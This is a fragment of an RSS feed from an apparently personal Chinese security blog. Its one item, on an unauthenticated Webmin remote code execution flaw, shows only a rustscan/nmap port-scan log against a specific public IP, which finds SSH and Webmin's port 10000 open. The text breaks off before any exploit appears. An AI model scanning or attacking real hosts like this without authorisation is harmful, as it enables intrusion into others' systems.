+&lt;/p&gt;</description></item><item><title>webmin未授权远程代码执行漏洞</title><link>https://luxuryzcx.github.io/posts/webmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link><pubDate>Wed, 17 Jun 2026 21:47:41 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/webmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid><description>&lt;p&gt;rustscan 扫端口&lt;/p&gt;
+&lt;p&gt;F:\渗透测试\信息收集\x86_64-windows-rustscan.exe&amp;gt;rustscan.exe -a 52.82.59.209
+.&amp;mdash;-. .-. .-. .&amp;mdash;-..&amp;mdash;. .&amp;mdash;-. .&amp;mdash;. .&amp;ndash;. .-. .-.
+| {} }| { } |{ {__ {_ &lt;em&gt;}{ {&lt;/em&gt;_ / ___} / {} \ | &lt;code&gt;| | | .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ | &lt;/code&gt;-&amp;rsquo; &lt;code&gt;-'&lt;/code&gt;&amp;mdash;&amp;ndash;&amp;rsquo;&lt;code&gt;----' &lt;/code&gt;-&amp;rsquo; &lt;code&gt;----' &lt;/code&gt;&amp;mdash;&amp;rsquo; &lt;code&gt;-' &lt;/code&gt;-&amp;rsquo;&lt;code&gt;-' &lt;/code&gt;-'
+The Modern Day Port Scanner.&lt;/p&gt;
+&lt;hr&gt;
+&lt;dl&gt;
+&lt;dt&gt;: &lt;a href="http://discord.skerritt.blog"&gt;http://discord.skerritt.blog&lt;/a&gt; :&lt;/dt&gt;
+&lt;dd&gt;&lt;a href="https://github.com/RustScan/RustScan"&gt;https://github.com/RustScan/RustScan&lt;/a&gt; :&lt;/dd&gt;
+&lt;/dl&gt;
+&lt;hr&gt;
+&lt;p&gt;0day was here ♥&lt;/p&gt;
+&lt;p&gt;[&lt;del&gt;] The config file is expected to be at &amp;ldquo;C:\Users\Luxury\.rustscan.toml&amp;rdquo;
+Open 52.82.59.209:22
+Open 52.82.59.209:10000
+[&lt;/del&gt;] Starting Script(s)
+[~] Starting Nmap 7.99 ( &lt;a href="https://nmap.org"&gt;https://nmap.org&lt;/a&gt; ) at 2026-04-15 15:09 +0800
+Initiating Ping Scan at 15:09
+Scanning 52.82.59.209 [4 ports]
+Completed Ping Scan at 15:09, 0.04s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 15:09
+Completed Parallel DNS resolution of 1 host. at 15:09, 0.37s elapsed
+DNS resolution of 1 IPs took 0.39s. Mode: Async [#: 2, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 15:09
+Scanning ec2-52-82-59-209.cn-northwest-1.compute.amazonaws.com.cn (52.82.59.209) [2 ports]
+Discovered open port 22/tcp on 52.82.59.209
+Discovered open port 10000/tcp on 52.82.59.209
+Completed SYN Stealth Scan at 15:09, 0.04s elapsed (2 total ports)
+Nmap scan report for ec2-52-82-59-209.cn-northwest-1.compute.amazonaws.com.cn (52.82.59.209)
+Host is up, received reset ttl 46 (0.037s latency).
+Scanned at 2026-04-15 15:09:15 �й���׼ʱ�� for 0s&lt;/p&gt;</description></item></channel></rss>
